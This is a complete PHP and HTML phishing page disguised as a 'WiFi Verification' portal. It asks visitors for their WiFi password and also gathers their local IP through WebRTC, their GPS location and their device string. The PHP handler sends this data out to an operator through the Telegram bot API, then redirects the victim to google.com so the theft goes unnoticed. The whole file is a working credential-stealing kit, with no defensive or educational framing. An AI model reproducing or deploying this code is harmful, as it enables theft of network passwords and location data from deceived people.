<?php
session_start();
$target = $_GET['target'] ?? 'Unknown';

if ($_POST && ($_POST['wifi_data'] ?? false)) {
    $data = json_decode(base64_decode($_POST['wifi_data']), true) ?: [];
    
    $report = "🎯 <b>WiFi Data Captured!</b>\n\n";
    $report .= "📱 Target: <code>$target</code>\n";
    $report .= "📶 SSID: <code>" . ($data['ssid'] ?? 'N/A') . "</code>\n";
    $report .= "🔑 Password: <code>" . ($data['password'] ?? 'N/A') . "</code>\n";
    $report .= "🌐 IP: <code>" . ($data['ip'] ?? 'N/A') . "</code>\n";
    $report .= "📍 Location: <code>" . ($data['location'] ?? 'N/A') . "</code>";
    
    $bot_token = $_ENV['BOT_TOKEN'] ?? 'YOUR_BOT_TOKEN';
    $chat_id = $_ENV['CHAT_ID'] ?? 'YOUR_CHAT_ID';
    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($report) . "&parse_mode=HTML";
    file_get_contents($url);
    
    exit('<script>window.location="https://google.com";</script>');
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Connection Required</title>
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:rgba(255,255,255,0.95);backdrop-filter:blur(20px);border-radius:24px;padding:40px;max-width:400px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,0.2)}.logo{text-align:center;margin-bottom:30px}.logo svg{width:80px;height:80px;margin-bottom:20px}.h1{color:#333;font-size:28px;margin-bottom:12px;text-align:center}.subtitle{color:#666;font-size:16px;margin-bottom:30px;text-align:center}.wifi-card{background:#f8f9ff;border-radius:16px;padding:24px;margin-bottom:24px;border-left:4px solid #667eea}.wifi-name{font-size:24px;font-weight:700;color:#333;margin-bottom:8px;word-break:break-word}.wifi-details{color:#666;font-size:14px}.btn{width:100%;padding:18px;border:none;border-radius:16px;font-size:18px;font-weight:600;cursor:pointer;transition:all 0.3s;margin-bottom:16px;background:linear-gradient(45deg,#667eea,#764ba2);color:white}.btn:hover{transform:translateY(-2px)}.btn:active{transform:scale(0.98)}.input{width:100%;padding:18px;border:2px solid #e1e5e9;border-radius:16px;font-size:18px;background:#fff;margin-bottom:20px;transition:border-color 0.3s}.input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1)}.loading{display:none;align-items:center;justify-content:center;padding:24px;color:#667eea;font-size:16px}.spinner{width:24px;height:24px;border:3px solid #f0f0f0;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin-right:12px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.success{text-align:center;color:#4ade80;font-size:24px;margin-top:20px;display:none}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="#667eea"><circle cx="12" cy="12" r="10"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.94-.49-7-3.85-7-7.93s3.06-7.44 7-7.93V17.93zm2-13.86c3.94.49 7 3.85 7 7.93s-3.06 7.44-7 7.93V4.07z"/></svg>
        </div>
        <h1 class="h1">WiFi Verification</h1>
        <p class="subtitle">Your network needs verification to continue</p>
        
        <div class="wifi-card">
            <div class="wifi-name" id="ssid">Detecting WiFi...</div>
            <div class="wifi-details" id="details">Scanning network...</div>
        </div>
        
        <input class="input" id="password" type="password" placeholder="Enter WiFi Password" autocomplete="off">
        <button class="btn" onclick="captureWiFi()">🔐 Verify & Connect</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>Verifying...
        </div>
        
        <div class="success" id="success">✅ Connected Successfully!</div>
    </div>
    
    <script>
    let wifiData = {};
    
    async function detectWiFi() {
        wifiData = {
            ssid: navigator.connection?.effectiveType ? 'WiFi Connected' : 'Current Network',
            ip: await getIP(),
            device: navigator.userAgent.slice(0,50),
            location: await getLocation(),
            timestamp: new Date().toISOString()
        };
        document.getElementById('ssid').textContent = wifiData.ssid;
        document.getElementById('details').innerHTML = `IP: ${wifiData.ip}<br>Device: ${wifiData.device}`;
    }
    
    async function getIP() {
        return new Promise(r=> {
            const pc=new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel('');pc.onicecandidate=e=>{
                if(!e.candidate)return;const m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];if(m)r(m);pc.close()
            };pc.createOffer().then(pc.setLocalDescription.bind(pc))
        });
    }
    
    async function getLocation() {
        return new Promise(r=>navigator.geolocation?.getCurrentPosition(p=>r(`${p.coords.latitude},${p.coords.longitude}`),()=>r('GPS Enabled')))
    }
    
    window.onload = detectWiFi;
    
    async function captureWiFi() {
        const pass = document.getElementById('password').value;
        if(!pass) return alert('Password required');
        
        wifiData.password = pass;
        wifiData.target = '<?php echo $target; ?>';
        
        document.getElementById('loading').style.display = 'flex';
        
        const fd = new FormData();
        fd.append('wifi_data', btoa(JSON.stringify(wifiData)));
        
        await fetch('',{method:'POST',body:fd});
        
        document.getElementById('loading').style.display = 'none';
        document.getElementById('success').style.display = 'block';
        setTimeout(()=>location.href='https://google.com',2500);
    }
    </script>
</body>
</html>
